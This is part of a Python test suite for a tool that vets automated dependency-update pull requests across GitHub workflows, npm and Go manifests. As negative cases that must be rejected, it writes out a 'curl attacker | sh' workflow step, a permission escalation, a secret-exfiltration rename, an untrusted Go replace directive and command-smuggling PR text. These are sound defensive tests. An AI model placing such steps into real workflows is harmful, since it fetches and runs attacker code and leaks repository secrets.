                path.write_text(json.dumps({"items": [envelope]}))
                self.assertEqual(native.read_request(path, "native_action"), {"action": "admit"})
            for output in ({}, {"items": [{"request": "{}"}]},
                           {"items": [{"type": "native_action", "request": "{}"}] * 2},
                           {"items": [{"type": "native_action", "request": {}, "extra": "ignored?"}]},
                           {"items": [], "errors": ["agent error"]},
                           {"items": [], "errors": {}},
                           {"items": [{"type": "native_action", "request": "{}"},
                                      {"type": "native_replacement", "request": "{}"}]}):
                path.write_text(json.dumps(output))
                with self.subTest(output=output), self.assertRaises(ValueError):
                    native.read_request(path, "native_action")

    def test_action_pin_change_is_allowed_but_commands_permissions_and_ref_injection_are_not(self):
        old = "permissions: read-all\nsteps:\n  - uses: github/codeql-action/init@" + "b" * 40 + " # v4.0.0\n  - run: echo safe\n"
        new = old.replace("b" * 40, PIN).replace("# v4.0.0", "# stale-comment")
        result = native.changes(".github/workflows/codeql.yml", old, new)
        self.assertEqual(result[0]["target"], PIN)
        self.assertEqual(native.upgrade_family("actions", result[0]["package"]), "github/codeql-action")
        for unsafe in (new.replace("read-all", "write-all"), new.replace("echo safe", "curl attacker | sh"),
                       new.replace("@" + PIN, "@v4"), new.replace("github/codeql-action", "attacker/codeql-action")):
            with self.subTest(unsafe=unsafe), self.assertRaises(ValueError):
                native.changes(".github/workflows/codeql.yml", old, unsafe)

    def test_compiled_action_metadata_and_hash_deltas_preserve_executable_body(self):
        def compiled(pin, digest, version="v1.0.0"):
            metadata = {"schema_version": "v4", "frontmatter_hash": digest * 64, "body_hash": "c" * 64,
                        "compiler_version": "v1.0.1", "strict": True, "agent_id": "copilot"}
            manifest_data = {"version": 1, "secrets": ["GITHUB_TOKEN"],
                             "actions": [{"repo": "actions/checkout", "sha": pin, "version": version}]}
            return ("# gh-aw-metadata: " + json.dumps(metadata) + "\n# gh-aw-manifest: " + json.dumps(manifest_data)
                    + "\npermissions: read-all\non: push\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@" + pin
                    + "\n      - run: echo safe\n")
        before, after = compiled("b" * 40, "d"), compiled(PIN, "e", "v2.0.0")
        with patch.object(native, "api", return_value={"sha": PIN}):
            entries = native.changes(".github/workflows/example.lock.yml", before, after)
            self.assertEqual(entries[0]["target"], PIN)
            for unsafe in (after.replace("read-all", "write-all"), after.replace("echo safe", "echo unsafe"),
                           after.replace("on: push", "on: pull_request_target"),
                           after.replace('"compiler_version": "v1.0.1"', '"compiler_version": "v9.0.0"'),
                           after.replace('"GITHUB_TOKEN"', '"SECRET_EXFILTRATION"')):
                with self.subTest(unsafe=unsafe), self.assertRaises(ValueError):
                    native.changes(".github/workflows/example.lock.yml", before, unsafe)

    def test_actions_lock_accepts_only_official_native_pin_and_preserves_containers(self):
        old_entry = {"repo": "actions/checkout", "version": "v1.0.0", "sha": "b" * 40}
        new_entry = {"repo": "actions/checkout", "version": "v2.0.0", "sha": PIN}
        before = {"entries": {"actions/checkout@v1.0.0": old_entry}, "containers": {"fixed": {"digest": "unchanged"}}}
        after = {"entries": {"actions/checkout@v2.0.0": new_entry}, "containers": copy.deepcopy(before["containers"])}
        group = {"family": "actions/checkout", "sources": [{"intents": [{"ecosystem": "actions", "package": "actions/checkout", "target": PIN}]}]}
        with patch.object(native, "api", return_value={"sha": PIN}):
            native.action_lock_changes(json.dumps(before), json.dumps(after), group)
            unsafe = copy.deepcopy(after)
            unsafe["containers"]["fixed"]["digest"] = "changed"
            with self.assertRaises(ValueError):
                native.action_lock_changes(json.dumps(before), json.dumps(unsafe), group)
        with patch.object(native, "api", return_value={"sha": "f" * 40}), self.assertRaises(ValueError):
            native.action_lock_changes(json.dumps(before), json.dumps(after), group)

    def test_official_action_commit_requires_release_tag_not_network_visibility(self):
        with patch.object(native, "api", return_value=[[{"name": "v2.0.0", "commit": {"sha": PIN}}]]):
            native.official_action_pin("actions/checkout", PIN)
            with self.assertRaisesRegex(ValueError, "release-tag"):
                native.official_action_pin("actions/checkout", "f" * 40)
        with patch.object(native, "api", return_value=[[{"name": "development", "commit": {"sha": PIN}}]]):
            with self.assertRaises(ValueError):
                native.official_action_pin("actions/checkout", PIN)

    def test_large_immutable_content_uses_exact_blob_fallback(self):
        value = b"complete generated document\n"
        blob = "d" * 40
        replies = [{"type": "file", "encoding": "none", "sha": blob, "size": len(value)},
                   {"encoding": "base64", "sha": blob, "size": len(value), "content": base64.b64encode(value).decode()}]
        with patch.object(native, "api", side_effect=replies) as api:
            self.assertEqual(native.content(REPO, PIN, "api/package-lock.json"), value.decode())
            self.assertEqual(api.call_args_list[1].args[0], f"repos/{REPO}/git/blobs/{blob}")

    def test_go_cascade_keeps_direct_family_and_all_indirect_intent(self):
        before = manifest(OLD)
        after = manifest(NEW).replace(")\n", "\tother.example/indirect v2.0.0 // indirect\n)\n")
        entries = native.changes("backend/go.mod", before, after, cascade=True)
        self.assertEqual({row["package"] for row in entries if row["direct"]}, {PACKAGE})
        native.verify_coverage(entries, lambda path: after)
        with self.assertRaises(ValueError):
            native.verify_coverage(entries, lambda path: manifest(NEW))
        with self.assertRaises(ValueError):
            native.changes("backend/go.mod", before, after.replace("go 1.26.0", "go 1.27.0"), cascade=True)

    def test_npm_security_override_and_scripts_cannot_be_removed_as_regeneration(self):
        before = json.dumps({"devDependencies": {"prettier": "3.9.9"}, "overrides": {"undici": "7.30.1"}, "scripts": {"build": "safe"}})
        after = before.replace("3.9.9", "3.9.10")
        self.assertEqual(native.changes("api/package.json", before, after)[0]["target"], "3.9.10")
        for unsafe in (after.replace('"undici": "7.30.1"', ''), after.replace('"build": "safe"', '"build": "unsafe"')):
            with self.assertRaises(ValueError):
                native.changes("api/package.json", before, unsafe)

    def test_nested_security_overrides_survive_unrelated_native_npm_update(self):
        document = {"devDependencies": {"prettier": "3.9.9"},
                    "overrides": {"undici": "7.30.1", "oav": {"jsonpath-plus": "10.3.0"},
                                  "@azure/ms-rest-js": {"uuid": "11.1.0"},
                                  "@azure-tools/typespec-go": {"@typespec/compiler": "$@typespec/compiler"}}}
        before = json.dumps(document)
        after = before.replace("3.9.9", "3.9.10")
        entries = native.changes("api/package.json", before, after)
        self.assertEqual([entry["package"] for entry in entries], ["prettier"])
        native.verify_coverage(entries, lambda path: after)
        bad = json.loads(after)
        del bad["overrides"]["oav"]
        with self.assertRaises(ValueError):
            native.changes("api/package.json", before, json.dumps(bad))
        bad = json.loads(after)
        bad["overrides"]["@azure/ms-rest-js"] = {"scripts": {"install": "unsafe"}}
        with self.assertRaises(ValueError):
            native.changes("api/package.json", before, json.dumps(bad))

    def test_npm_coverage_accepts_compatible_newer_stable_versions_not_downgrades(self):
        for actual, target in (("3.9.11", "3.9.10"), ("^1.18.0", "^1.17.0"), ("7.30.1", "^7.29.0")):
            self.assertTrue(native.npm_covers(actual, target))
        for actual, target in (("3.9.9", "3.9.10"), ("4.0.0", "3.9.10"), ("latest", "^1.17.0"),
                               ("^1.18.0", "1.17.0"), ("^0.74.0", "^0.73.2")):
            self.assertFalse(native.npm_covers(actual, target))
        old = {"node_modules/undici": ("undici", "7.30.1", None, None),
               "node_modules/prettier": ("prettier", "3.9.9", None, None)}
        new = {**old, "node_modules/prettier": ("prettier", "3.9.11", None, None)}
        native.preserve_npm_resolutions(old, new)
        new["node_modules/undici"] = ("undici", "7.0.0", None, None)
        with self.assertRaises(ValueError):
            native.preserve_npm_resolutions(old, new)

    def test_obsolete_workflow_requires_both_live_source_and_lock_coverage(self):
        old = "steps:\n  - uses: actions/checkout@" + "b" * 40 + "\n"
        new = old.replace("b" * 40, PIN)
        intents = native.changes(".github/workflows/obsolete.yml", old, new)
        files = {".github/workflows/obsolete.md": new, ".github/workflows/obsolete.lock.yml": new}
        native.verify_coverage(intents, files.__getitem__, set(files))
        files[".github/workflows/obsolete.lock.yml"] = old
        with self.assertRaises(ValueError):
            native.verify_coverage(intents, files.__getitem__, set(files))
        del files[".github/workflows/obsolete.lock.yml"]
        with self.assertRaises(ValueError):
            native.verify_coverage(intents, files.__getitem__, set(files))

    def test_unrelated_package_same_manifest_does_not_cover_upgrade(self):
        intents = native.changes("api/package.json", '{"dependencies":{"one":"1.0.0","two":"1.0.0"}}', '{"dependencies":{"one":"2.0.0","two":"1.0.0"}}')
        with self.assertRaises(ValueError):
            native.verify_coverage(intents, lambda path: '{"dependencies":{"one":"1.0.0","two":"2.0.0"}}')

    def test_typespec_primary_upgrade_allows_transitive_lock_graph_replacement(self):
        base, head = "0" * 40, "1" * 40
        before_manifest = {"dependencies": {"@typespec/compiler": "^1.16.0",
                                             "@azure-tools/typespec-go": "^0.17.4",
                                             "@typespec/http": "^1.16.0"},
                           "overrides": {"undici": "^7.30.1", "oav": {"ajv": "^6.12.6"}}}
        after_manifest = copy.deepcopy(before_manifest)
        after_manifest["dependencies"].update({"@typespec/compiler": "^1.17.0",
                                                "@azure-tools/typespec-go": "^0.17.6"})
        def lock(compiler, emitter, transitive):
            return {"lockfileVersion": 3, "packages": {
                "": {"dependencies": {"@typespec/compiler": "^1.17.0"}},
                "node_modules/@typespec/compiler": {"version": compiler},
                "node_modules/@typespec/http": {"version": compiler},
                "node_modules/@azure-tools/typespec-go": {"version": emitter},
                "node_modules/undici": {"version": "7.30.1"},
                "node_modules/" + transitive: {"version": "2.0.0"}}}
        before_lock = lock("1.16.0", "0.17.4", "removed-transitive")
        after_lock = lock("1.17.0", "0.17.6", "new-transitive")
        documents = {(base, "api/package.json"): json.dumps(before_manifest),
                     (head, "api/package.json"): json.dumps(after_manifest),
                     (base, "api/package-lock.json"): json.dumps(before_lock),
                     (head, "api/package-lock.json"): json.dumps(after_lock)}
        snap = {"pull": {"number": 7460, "base": {"sha": base}, "head": {"sha": head}},
                "files": [{"filename": path, "status": "modified"}
                          for path in ("api/package-lock.json", "api/package.json")]}
        with patch.object(native, "api", return_value={"merge_base_commit": {"sha": base}}), \
                patch.object(native, "content", side_effect=lambda repo, sha, path: documents[(sha, path)]):
            group = native.source_intent(REPO, snap)
            self.assertEqual(group["family"], "typespec")
            self.assertEqual({item["package"] for item in group["intents"]},
                             {"@typespec/compiler", "@azure-tools/typespec-go", "@typespec/http"})
            self.assertTrue(all(item["lock_manifests"] == ["api/package-lock.json"]
                                for item in group["intents"] if item["manifest"].endswith("package.json")))
            lock_only = {**snap, "files": snap["files"][:1]}
            with self.assertRaisesRegex(ValueError, "lack primary"):
                native.source_intent(REPO, lock_only)
        # Fresh solver output may replace historical transitives again and
        # resolve a newer compatible primary patch, without downgrading undici.
        regenerated = lock("1.17.2", "0.17.7", "another-current-transitive")
        files = {"api/package.json": json.dumps(after_manifest),
                 "api/package-lock.json": json.dumps(regenerated)}
        native.verify_coverage(group["intents"], files.__getitem__, set(files))
        native.preserve_npm_resolutions(native.lock_versions(before_lock), native.lock_versions(regenerated))
        regenerated["packages"]["node_modules/@typespec/http"]["version"] = "1.16.0"
        files["api/package-lock.json"] = json.dumps(regenerated)
        with self.assertRaisesRegex(ValueError, "upgrade intent is not covered"):
            native.verify_coverage(group["intents"], files.__getitem__, set(files))
        regenerated["packages"]["node_modules/@typespec/http"]["version"] = "1.17.2"
        regenerated["packages"]["node_modules/@typespec/compiler"]["version"] = "1.16.0"
        files["api/package-lock.json"] = json.dumps(regenerated)
        with self.assertRaisesRegex(ValueError, "compatible lock resolution"):
            native.verify_coverage(group["intents"], files.__getitem__, set(files))
        added_primary = copy.deepcopy(after_manifest)
        added_primary["dependencies"]["@typespec/unapproved"] = "^1.17.0"
        with self.assertRaisesRegex(ValueError, "added/removed dependency"):
            native.changes("api/package.json", json.dumps(before_manifest), json.dumps(added_primary))

    def test_targeted_tree_proofs_do_not_enumerate_truncated_vendor_repositories(self):
        root, github, workflows, blob, vendor = ("0" * 40, "1" * 40, "2" * 40, "3" * 40, "4" * 40)
        trees = {
            root: [{"path": ".github", "type": "tree", "mode": "040000", "sha": github},
                   {"path": "vendor", "type": "tree", "mode": "040000", "sha": vendor}],
            github: [{"path": "workflows", "type": "tree", "mode": "040000", "sha": workflows}],
            workflows: [{"path": "obsolete.md", "type": "blob", "mode": "100644", "sha": blob},
                        {"path": "obsolete.lock.yml", "type": "blob", "mode": "100644", "sha": blob}]}
        def api(endpoint, **kwargs):
            if endpoint.endswith("?recursive=1"):
                return {"truncated": True, "tree": [{"path": "vendor/partial", "sha": blob}]}
            sha = endpoint.rsplit("/", 1)[1]
            self.assertNotEqual(sha, vendor, "irrelevant vendor subtree must never be fetched")
            return {"truncated": False, "tree": trees[sha]}
        old = "steps:\n  - uses: actions/checkout@" + "b" * 40 + "\n"
        new = old.replace("b" * 40, PIN)
        intents = native.changes(".github/workflows/obsolete.yml", old, new)
        with patch.object(native, "api", side_effect=api) as mocked:
            cache = {}
            available = native.tree_paths(REPO, root, native.coverage_paths(intents), cache)
            self.assertEqual(available, {".github/workflows/obsolete.md", ".github/workflows/obsolete.lock.yml"})
            native.verify_coverage(intents, lambda path: new, available)
            native.tree_paths(REPO, root, native.coverage_paths(intents), cache)
            self.assertEqual(mocked.call_count, 3)
        with patch.object(native, "api", return_value={"truncated": True, "tree": []}):
            with self.assertRaisesRegex(ValueError, "incomplete targeted"):
                native.tree_paths(REPO, root, {".github/workflows/obsolete.md"})

    def test_go_semver_prerelease_and_pseudo_version_ordering(self):
        for actual, target in (("v1.19.0", "v1.18.4"), ("v3.0.0-beta.10", "v3.0.0-beta.3"),
                               ("v3.0.0", "v3.0.0-rc.1"),
                               ("v0.0.0-20261030010000-abcdef123456", "v0.0.0-20261029010000-abcdef123456"),
                               ("v2.0.0+incompatible", "v2.0.0")):
            self.assertTrue(native.version_covers(actual, target))
            if actual.split("+")[0] != target.split("+")[0]:
                self.assertFalse(native.version_covers(target, actual))
        self.assertFalse(native.version_covers("unverifiable", "v1.0.0"))

    def test_generated_typespec_sdk_module_metadata_is_constrained(self):
        path = "test/sdk/v20261001/resourcemanager/redhatopenshifthcp/armredhatopenshifthcp/go.mod"
        prefix = "module github.com/Azure/ARO-HCP/" + str(Path(path).parent) + "\n\ngo 1.25.0\n\n"
        before = prefix + "require github.com/Azure/azure-sdk-for-go/sdk/azcore v1.23.0\n"
        after = before.replace("go 1.25.0", "go 1.26.0").replace("v1.23.0", "v1.23.3")
        after += "\nrequire (\n golang.org/x/net v0.59.0 // indirect\n golang.org/x/text v0.42.0 // indirect\n)\n"
        native.validate_sdk_module(path, before, after, "1.26.0")
        self.assertTrue(native.sdk_consumer(path))
        self.assertFalse(native.sdk_consumer("test/sdk/arbitrary/go.mod"))
        for unsafe in (after + "\nreplace example.com/package => /tmp/untrusted\n",
                       after + "\ntoolchain go1.27.0\n",
                       after + "\nrequire attacker.example/unrelated v1.0.0\n",
                       after.replace("go 1.26.0", "go 1.27.0"),
                       after.replace("module github.com/Azure/ARO-HCP/", "module attacker.example/")):
            with self.subTest(unsafe=unsafe), self.assertRaises(ValueError):
                native.validate_sdk_module(path, before, unsafe, "1.26.0")

    def test_fixed_label_creation_race_reads_back_exact_name_and_auth_errors_fail_closed(self):
        missing = subprocess.CalledProcessError(1, ["gh", "api"], stderr="gh: Not Found (HTTP 404)")
        raced = subprocess.CalledProcessError(1, ["gh", "api"], stderr="gh: Already exists (HTTP 422)")
        with patch.object(native, "api", side_effect=[missing, raced, {"id": 1, "name": native.LABEL}]) as api:
            native.ensure_label(REPO)
            self.assertEqual(api.call_args_list[1].kwargs["data"]["name"], native.LABEL)
        denied = subprocess.CalledProcessError(1, ["gh", "api"], stderr="gh: Forbidden (HTTP 403)")
        with patch.object(native, "api", side_effect=denied) as api, self.assertRaises(subprocess.CalledProcessError):
            native.ensure_label(REPO)
        self.assertEqual(api.call_count, 1)

    def test_publication_text_never_injects_commands_or_human_notifications(self):
        native.safe_text("chore(deps): @typespec/compiler to 1.17.0", title=True)
        for text in ("fixes #123", "hello @reviewer", "evidence\n/retest", "<!-- " + native.MARKER + "spoof -->"):
            with self.subTest(text=text), self.assertRaises(ValueError):
                native.safe_text(text)


if __name__ == "__main__":
    unittest.main()
